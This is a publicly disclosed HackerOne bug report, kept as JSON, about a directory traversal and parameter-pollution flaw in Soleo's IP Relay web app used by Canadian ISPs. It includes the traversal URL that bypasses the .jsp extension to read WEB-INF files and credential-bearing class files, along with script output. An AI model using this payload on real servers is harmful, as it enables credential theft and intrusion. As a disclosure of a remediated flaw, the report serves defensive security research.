{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": true, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "foobar7", 
        "eveeez", 
        "dmatrix", 
        "pisarenko", 
        "protector47", 
        "cryptographer", 
        "sameerphad72", 
        "kody17", 
        "arice", 
        "recolin", 
        "and 5 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 413193, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Directory Traversal + HTTP Paramater Pollution leaking SQL/LDAP credentials", 
    "is_member_of_team?": null, 
    "vote_count": 15, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 10730, 
            "content": "SOLEO IP Relay (by Soleo communications) is a cloud-based IP Relay service for telecommunications providers. It is a solution in compliance with government-mandated service requirements for IP Relay Services, also known as \u201cRemote Interpreting Services\u201d. It is a service that allows people who are deaf, hard of hearing, or have a speech disorder to place calls through a TTY or other assistive telephone device. IP Relay is also commonly known as \u201cTRS\u201d, \u201crelay service\u201d or \u201cIP-Relay\u201d.  \n\nThrough Directory Traversal, a File Disclosure vulnerability was identified in Soleo's IP Relay Application, HTTP parameter poisoning was utilized to bypass the appended `.JSP` file extension, leading to the disclosure of sensitive java `.class` files which contained information such as SQL and LDAP credentials used by the Java Servlet, allowing an attacker to authenticate via these services. Every major Internet Service Provider in Canada was affected by this vulnerability, alongside some US-based providers. \n\nHere you can find one of the articles covering our findings: https://www.securityweek.com/vulnerability-ip-relay-service-impacts-major-canadian-isps", 
            "content_html": "<p>SOLEO IP Relay (by Soleo communications) is a cloud-based IP Relay service for telecommunications providers. It is a solution in compliance with government-mandated service requirements for IP Relay Services, also known as \u201cRemote Interpreting Services\u201d. It is a service that allows people who are deaf, hard of hearing, or have a speech disorder to place calls through a TTY or other assistive telephone device. IP Relay is also commonly known as \u201cTRS\u201d, \u201crelay service\u201d or \u201cIP-Relay\u201d.  </p>\n\n<p>Through Directory Traversal, a File Disclosure vulnerability was identified in Soleo&#39;s IP Relay Application, HTTP parameter poisoning was utilized to bypass the appended <code>.JSP</code> file extension, leading to the disclosure of sensitive java <code>.class</code> files which contained information such as SQL and LDAP credentials used by the Java Servlet, allowing an attacker to authenticate via these services. Every major Internet Service Provider in Canada was affected by this vulnerability, alongside some US-based providers. </p>\n\n<p>Here you can find one of the articles covering our findings: <a title=\"https://www.securityweek.com/vulnerability-ip-relay-service-impacts-major-canadian-isps\" href=\"/redirect?signature=46d6ed8c8f862fea3b543e0857d681cc32eb0e00&amp;url=https%3A%2F%2Fwww.securityweek.com%2Fvulnerability-ip-relay-service-impacts-major-canadian-isps\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.securityweek.com/vulnerability-ip-relay-service-impacts-major-canadian-isps</span><i class=\"icon-external-link\"></i></a></p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "classfile.png", 
            "type": "image/png", 
            "id": 350125, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/350/125/1ffa27d7983298a0993f421fb65ae5d3163fc73b/classfile.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221639Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efb0213d2d1c50e9966a3bb012e7978615e5b6c0ec0c07c7f2e6173992e3c75e"
        }, 
        {
            "file_name": "IPRelay.png", 
            "type": "image/png", 
            "id": 350126, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/350/126/137f924f8082ed99a272fed55e7913a87eeaa0b1/IPRelay.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221639Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=844acfe47276b2c4e7b3c70a176dc8c9fd476abb841922e8f0383d5f24e94e4a"
        }, 
        {
            "file_name": "webinf.png", 
            "type": "image/png", 
            "id": 350127, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/350/127/3c0cc336044da65545a60a0f5ac2eb616df72772/webinf.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221639Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9787cbd81d762ace3aa0a7ca2a6887ecb10b2db6966cb1c5adf9a3f102565de0"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "project-insecurity", 
                "url": "/project-insecurity"
            }, 
            "created_at": "2018-08-10T22:25:59.000Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-10T22:25:59.000Z", 
            "actor": {
                "username": "project-insecurity", 
                "url": "/project-insecurity", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/997/de034e1c4ef2bc6d951da752c216aa2720d46271_medium.png?1526315656"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "soleo", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3376820, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-24T16:28:03.333Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-24T16:28:03.333Z", 
            "actor": {
                "username": "project-insecurity", 
                "url": "/project-insecurity", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/997/de034e1c4ef2bc6d951da752c216aa2720d46271_medium.png?1526315656"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "soleo", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3380384, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "project-insecurity", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/project-insecurity", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/005/997/a3fc6a59d5979e99203cf278289b3764cccdb33f_small.png?1526315656"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-09-24T16:28:03.288Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/413193", 
    "created_at": "2018-07-17T22:25:59.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Upon visiting the login page of a provider\u2019s IP Relay client, we noticed that if someone were to click the \u201cforgot password\u201d link, it would bring them to a URL which appeared as the following: </p>\n\n<p><code>https://&lt;host&gt;.&lt;tld&gt;/IPRelayApp/servlet/IPRelay?page=forgotPassword</code></p>\n\n<p>When attempting to modify the &quot;page&quot; GET parameter, a .jsp extension was appended to the inputted value, preventing File Disclosure from taking place. Use of nullbytes to bypass this extension being appended was an unlikely option, so we turned to HTTP parameter poisoning. By including a trailing question mark on the file name, we were able to fool the server<br>\ninto thinking it was about to receive a parameter, effectively truncating the trailing <code>.jsp</code> extension, like so:</p>\n\n<p><code>https://&lt;host&gt;/IPRelayApp/servlet/IPRelay?page=anyfile.txt?</code></p>\n\n<p>Attempting Local File Disclosure resulted in an error, but File Disclosure itself was still an option - the web-app is restricted to only loading files from within a certain directory. This limits us to only loading files within <code>IPRelayApp/*</code>. In this scenario, this is what the directory layout looked like, thanks to Tomcat:</p>\n\n<p><code>IPRelayApp/<br>\n  |- jsp/<br>\n  |- images/<br>\n  |- html/<br>\n  |- META-INF/<br>\n  |- WEB-INF/<br>\n    |- classes/<br>\n        |- help/<br>\n        |- logs/<br>\n        |- lib/<br>\n        |- xml/<br>\n        |- files/<br>\n        |- web.xml</code></p>\n\n<p>The <code>WEB-INF</code> directory is within the IPRelayApp directory, meaning we could load <code>web.xml</code>, an XML document that has a few mappings for Tomcat to understand where to pull certain files from. Attached is proof of the file getting loaded. Here is what the proof-of-concept would look like by this point:</p>\n\n<p><code>http://&lt;host&gt;/IPRelayApp/servlet/IPRelay?page=../WEB-INF/web.xml?</code></p>\n\n<p>At this point, we wrote a little proof-of-concept to parse the web.xml file and find the location of the source files. This was purely to confirm the severity of this vulnerability. This was the output of our script:</p>\n\n<p><code>[+] connecting to &lt;redacted&gt;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/filters/LoggedInFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/filters/RedirectionFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/filters/HostnameFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/filters/SetHeadersFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/filters/SetHeadersFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/filters/ChangePasswordFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/filters/EncodingFilter.class&#39;<br>\nsrc file found @<br>\n&#39;com/soleo/iprelayapp/filters/PasswordChangeRestrictionFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/filters/SSORedirectFilter.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/common/ContextListener.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/LoginServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/SoleoInteractionServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/CreateUserServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/CreateCDRServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/FindSecurityQuestionServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/ChangePasswordServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/VerifyAccountServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/GenerateIPRelayPageServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/ProfilePageServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/ProfileServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/PreferencesPageServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/RegistrationPageServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/WelcomeServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/LogoutServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/UpdateProfileServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/UpdatePreferencesServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/ValidateIPUserStatusServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/OfflineMessageServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/AddressBookServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/SaveIPConversationServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/SessionPingServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/servlet/PingServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayweb/common/servlet/Skinner.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/FinishLoginServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/SSOEntryServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/ShibbolethErrorServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/MakeCallServlet.class&#39;<br>\nsrc file found @ &#39;com/soleo/iprelayapp/servlets/ChangeOperatingLanguage.class&#39;</code></p>\n\n<p>All of the following files can be downloaded by loading them from <code>WEB-INF/classes/*</code>.  Once again, to confirm severity, we tried to load one of these files, specifically <code>IPRelay.class</code> - the attached image shows the file being successfully downloaded.</p>\n\n<p>After loading this file into our text editor, it was evident that these classes had been compiled in Java bytecode. However, a determined attacker would easily be able to convert this directly back to source, compromising source code and other sensitive files. Within the source code lies passwords which allow the servlet to communicate with other services, such as SQL/LDAP. An attacker could extract these passwords from within the source files, and further escalate their privileges on the server, or even use said information in a social engineering attack. The end result could be escalated to yield remote code execution, though we were not comfortable attempting to do this before getting in contact with the vendor. Attached you can find a <code>.class</code> file which leads to sensitive Information Disclosure.</p>\n\n<p>Essentially every Internet Service Provider in Canada uses Soleo\u2019s IP Relay service. This was not an initial discovery however upon further analysis the impact of this vulnerability kept increasing. By utilizing Google dorks, we were able to determine that there were at least \u200bten \u200bother Internet Service Providers in Canada that wererunning the same vulnerable instance of Soleo\u2019s IP Relay. Interestingly enough six out of the ten vulnerable ISPs were actually the largest telecom providers in Canada.</p>\n\n<p>To conclude this report, we have confirmed that a determined attacker (APT/foreign entity) could leverage this vulnerability to steal passwords from configuration files across multiple providers, compromise said providers using the stolen passwords, and then \u200bpotentially\u200b launch a large scale identity theft operation against Canadians. Seeing as Canada\u2019s federal elections are coming up in 2019, this vulnerability could have had detrimental effects for Canadian citizens who confide in these providers to safeguard their identity. Due to our concerns about the social security of Canadian citizens, we decided to compile a list of the providers that were affected by this vulnerability. In total this can ultimately lead to the compromise of over 30 million Canadian records. Here are some major providers that were affected:</p>\n\n<p><code>Bell<br>\nSasktel<br>\nTelus<br>\nShaw<br>\nVideotron<br>\nMTS<br>\nRogers (their services are hosted at iprelayservice.net)<br>\nBell Aliant<br>\nCogeco<br>\nFido (their services are hosted at iprelayservice.net)<br>\nKoodo (their services are hosted at iprelayservice.net)<br>\nChatr (their services are hosted at iprelayservice.net)<br>\nAllStream<br>\nEastLink</code></p>\n\n<p>This flaw was remediated on 10th August 2018, roughly three weeks after our initial disclosure.</p>\n", 
    "vulnerability_information": "Upon visiting the login page of a provider\u2019s IP Relay client, we noticed that if someone were to click the \u201cforgot password\u201d link, it would bring them to a URL which appeared as the following: \n\n`https://<host>.<tld>/IPRelayApp/servlet/IPRelay?page=forgotPassword`\n\nWhen attempting to modify the \"page\" GET parameter, a .jsp extension was appended to the inputted value, preventing File Disclosure from taking place. Use of nullbytes to bypass this extension being appended was an unlikely option, so we turned to HTTP parameter poisoning. By including a trailing question mark on the file name, we were able to fool the server\ninto thinking it was about to receive a parameter, effectively truncating the trailing `.jsp` extension, like so:\n\n`https://<host>/IPRelayApp/servlet/IPRelay?page=anyfile.txt?`\n\nAttempting Local File Disclosure resulted in an error, but File Disclosure itself was still an option - the web-app is restricted to only loading files from within a certain directory. This limits us to only loading files within `IPRelayApp/*`. In this scenario, this is what the directory layout looked like, thanks to Tomcat:\n\n`IPRelayApp/\n  |- jsp/\n  |- images/\n  |- html/\n  |- META-INF/\n  |- WEB-INF/\n\t|- classes/\n        |- help/\n        |- logs/\n        |- lib/\n        |- xml/\n        |- files/\n        |- web.xml`\n\nThe `WEB-INF` directory is within the IPRelayApp directory, meaning we could load `web.xml`, an XML document that has a few mappings for Tomcat to understand where to pull certain files from. Attached is proof of the file getting loaded. Here is what the proof-of-concept would look like by this point:\n\n`http://<host>/IPRelayApp/servlet/IPRelay?page=../WEB-INF/web.xml?`\n\nAt this point, we wrote a little proof-of-concept to parse the web.xml file and find the location of the source files. This was purely to confirm the severity of this vulnerability. This was the output of our script:\n\n`[+] connecting to <redacted>\nsrc file found @ 'com/soleo/iprelayweb/common/filters/LoggedInFilter.class'\nsrc file found @ 'com/soleo/iprelayweb/common/filters/RedirectionFilter.class'\nsrc file found @ 'com/soleo/iprelayweb/common/filters/HostnameFilter.class'\nsrc file found @ 'com/soleo/iprelayweb/common/filters/SetHeadersFilter.class'\nsrc file found @ 'com/soleo/iprelayweb/common/filters/SetHeadersFilter.class'\nsrc file found @ 'com/soleo/iprelayapp/filters/ChangePasswordFilter.class'\nsrc file found @ 'com/soleo/iprelayweb/common/filters/EncodingFilter.class'\nsrc file found @\n'com/soleo/iprelayapp/filters/PasswordChangeRestrictionFilter.class'\nsrc file found @ 'com/soleo/iprelayapp/filters/SSORedirectFilter.class'\nsrc file found @ 'com/soleo/iprelayapp/common/ContextListener.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/LoginServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/SoleoInteractionServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/CreateUserServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/CreateCDRServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/FindSecurityQuestionServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/ChangePasswordServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/VerifyAccountServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/GenerateIPRelayPageServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/ProfilePageServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/ProfileServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/PreferencesPageServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/RegistrationPageServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/WelcomeServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/LogoutServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/UpdateProfileServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/UpdatePreferencesServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/ValidateIPUserStatusServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/OfflineMessageServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/AddressBookServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/SaveIPConversationServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/SessionPingServlet.class'\nsrc file found @ 'com/soleo/iprelayweb/common/servlet/PingServlet.class'\nsrc file found @ 'com/soleo/iprelayweb/common/servlet/Skinner.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/FinishLoginServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/SSOEntryServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/ShibbolethErrorServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/MakeCallServlet.class'\nsrc file found @ 'com/soleo/iprelayapp/servlets/ChangeOperatingLanguage.class'`\n\nAll of the following files can be downloaded by loading them from `WEB-INF/classes/*`.  Once again, to confirm severity, we tried to load one of these files, specifically `IPRelay.class` - the attached image shows the file being successfully downloaded.\n\nAfter loading this file into our text editor, it was evident that these classes had been compiled in Java bytecode. However, a determined attacker would easily be able to convert this directly back to source, compromising source code and other sensitive files. Within the source code lies passwords which allow the servlet to communicate with other services, such as SQL/LDAP. An attacker could extract these passwords from within the source files, and further escalate their privileges on the server, or even use said information in a social engineering attack. The end result could be escalated to yield remote code execution, though we were not comfortable attempting to do this before getting in contact with the vendor. Attached you can find a `.class` file which leads to sensitive Information Disclosure.\n\nEssentially every Internet Service Provider in Canada uses Soleo\u2019s IP Relay service. This was not an initial discovery however upon further analysis the impact of this vulnerability kept increasing. By utilizing Google dorks, we were able to determine that there were at least \u200bten \u200bother Internet Service Providers in Canada that wererunning the same vulnerable instance of Soleo\u2019s IP Relay. Interestingly enough six out of the ten vulnerable ISPs were actually the largest telecom providers in Canada.\n\nTo conclude this report, we have confirmed that a determined attacker (APT/foreign entity) could leverage this vulnerability to steal passwords from configuration files across multiple providers, compromise said providers using the stolen passwords, and then \u200bpotentially\u200b launch a large scale identity theft operation against Canadians. Seeing as Canada\u2019s federal elections are coming up in 2019, this vulnerability could have had detrimental effects for Canadian citizens who confide in these providers to safeguard their identity. Due to our concerns about the social security of Canadian citizens, we decided to compile a list of the providers that were affected by this vulnerability. In total this can ultimately lead to the compromise of over 30 million Canadian records. Here are some major providers that were affected:\n\n`Bell\nSasktel\nTelus\nShaw\nVideotron\nMTS\nRogers (their services are hosted at iprelayservice.net)\nBell Aliant\nCogeco\nFido (their services are hosted at iprelayservice.net)\nKoodo (their services are hosted at iprelayservice.net)\nChatr (their services are hosted at iprelayservice.net)\nAllStream\nEastLink`\n\nThis flaw was remediated on 10th August 2018, roughly three weeks after our initial disclosure.\n\n\n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.soleo.com/", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Soleo"
        }, 
        "handle": "soleo", 
        "url": "https://hackerone.com/soleo", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/392/6ca44d233b40aeb80496a9e508d991c1034f5149_small.jpg?1538620074", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/033/392/e31a8c54024f725aa584ed13a0eb2dfc0ddc905e_medium.jpg?1538620074"
        }, 
        "id": 33392, 
        "permissions": []
    }, 
    "is_published": true
}